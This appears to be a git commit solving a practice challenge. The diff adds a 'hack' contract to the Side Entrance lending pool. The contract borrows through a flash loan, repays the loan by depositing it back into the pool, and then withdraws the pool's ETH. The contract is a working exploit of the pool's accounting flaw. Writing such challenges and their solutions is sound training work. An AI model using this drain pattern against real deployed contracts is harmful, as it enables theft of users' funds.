e28600a28e70db33f40958f27a36e00ca945c63b
Alberto <alby.giaco@live.it>
2022-05-19 15:31:21 +0200

    4th

--- contracts/side-entrance/SideEntranceLenderPool.sol
+++ contracts/side-entrance/SideEntranceLenderPool.sol
@@ -2,9 +2,43 @@
 
 pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
+import "hardhat/console.sol";
 
 interface IFlashLoanEtherReceiver {
     function execute() external payable;
+}
+
+interface IPool {
+    function deposit() external payable;
+
+    function flashLoan(uint256 amount) external payable;
+
+    function withdraw() external;
+}
+
+contract hack {
+    using Address for address payable;
+
+    address pool;
+
+    constructor(address _pool) {
+        pool = _pool;
+    }
+
+    function execute() external payable {
+        IPool(pool).deposit{value: msg.value}();
+    }
+
+    function hacker(uint256 amount) public payable {
+        IPool(pool).flashLoan(amount);
+    }
+
+    function withdraw() public payable {
+        IPool(pool).withdraw();
+        payable(msg.sender).sendValue(address(this).balance);
+    }
+
+    receive() external payable {}
 }
 
 /**
@@ -14,7 +48,7 @@ interface IFlashLoanEtherReceiver {
 contract SideEntranceLenderPool {
     using Address for address payable;
 
-    mapping (address => uint256) private balances;
+    mapping(address => uint256) private balances;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
@@ -29,10 +63,12 @@ contract SideEntranceLenderPool {
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
         require(balanceBefore >= amount, "Not enough ETH in balance");
-        
+
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+        require(
+            address(this).balance >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
     }
 }
- 
